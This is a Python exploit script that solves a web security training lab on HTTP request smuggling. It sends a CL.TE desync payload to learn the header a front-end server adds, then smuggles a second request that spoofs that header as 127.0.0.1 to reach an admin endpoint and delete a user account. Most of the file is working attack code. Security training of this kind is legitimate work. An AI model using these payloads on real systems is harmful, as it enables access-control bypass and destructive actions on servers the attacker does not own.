import sys
import requests
import re
import bs4
import ssl
import urllib3
import socket
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


"""Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting"""

def Exctract_header(target_host,target_port):

    # - The payload is designed to perform an HTTP request smuggling attack.
    # - The goal is to detect the header added by the front-end server when rewriting the request.
    # - The request was smuggled while searching by test value. It should be added to the test value as we have a length of 190. The search function reflects the value you attach to her.
    payload=(
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 105\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 190\r\n"
        "\r\n"
        "search=test"

    )

    try:
        # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
        #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((target_host,target_port)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                
                
                    securesock.sendall(payload.encode("utf-8"))#sending the payload 
                    response=securesock.recv(4096) #recving data  
                     #check if we have 200 OK response 
                    if "HTTP/1.1 200 OK" in response.decode(errors="ignore",encoding="utf-8"):
                        # sending the request, to see if x header reflected in the response
                        response_normal =requests.post("https://"+target_host,verify=False)
                        # If we receive this text in response, it indicates that we have received what we wanted.
                        if "0 search results for" in response_normal.text:
                                 # Use BeautifulSoup to parse the response HTML
                            be=bs4.BeautifulSoup(response_normal.text,'html.parser')
                            data=str(be.find_all('h1'))

                            # Extract the rewritten header added by the front-end using regex
                            #x_header=re.findall(r'X.+\-.+\:',data)
                            x_header=re.findall(r'X-\w+-\w+:',data)                       
                            return x_header[0]

                        
    except Exception as err:
        print(f'(-) {err}')
        exit()
         
    

def CL_TE_REWRITING(target_host,target_port,x_header):

    # - This payload leverages the previously extracted header to smuggle a malicious request.
    # - The second request targets the admin delete functionality.
    # - The "X-" header is used to fool the backend into thinking the request is legitimate.
    

    payload_two=(
    "POST / HTTP/1.1\r\n"
    f"Host: {target_host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 146\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "POST /admin/delete?username=carlos HTTP/1.1\r\n"
    f"{x_header} 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 3\r\n"
    "\r\n"
    "x="
        )
    
    try:
        # Create SSL context for HTTPS
        #Creates a secure environment for HTTPS communication.
        context_ssl=ssl.create_default_context()
        #Opens a connection to the server (target_host) on the specified port (target_port).
        with socket.create_connection((target_host,target_port)) as sock:
            #Wraps the socket connection with encryption for secure data transfer.
            with context_ssl.wrap_socket(sock,server_hostname=target_host) as securesock:
                print('(+) Sending payload .... ')
                securesock.sendall(payload_two.encode(errors="ignore",encoding="utf-8"))    #sending the payload 
                response_smuggling=securesock.recv(4096) #recving data  
                 #check if we have 200 OK response 
                if "HTTP/1.1 200 OK" in response_smuggling.decode():
                    response_normal=requests.post("https://"+target_host,verify=False)
                    if "Congratulations, you solved the lab!" in response_normal.text:

                        print("(+) Request smuggled successfully . ")
                        print('(+) Congratulations, you solved the lab .')
                        sys.exit()

                    else:
                        print('(-) Error')

                elif "504 Gateway Timeout" in response_smuggling.decode():  #check if the host down or not 
                    print("(-) No response received from the server .")
                    sys.exit()

                else:
                    print('(-) Error !')
                   
    except Exception as err:
        print(f'(-) {err}')

                               
 
def main():

    if len(sys.argv) !=2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net'%sys.argv[0])
        sys.exit(1)
    
    target_host=sys.argv[1]
    target_port=443
    x_header=Exctract_header(target_host,target_port)

    if x_header:
        CL_TE_REWRITING(target_host,target_port,x_header)
    else:
        print('(-) During our attempt to obtain the rewriting header, something went wrong .')
        exit()


if __name__=='__main__':
    main()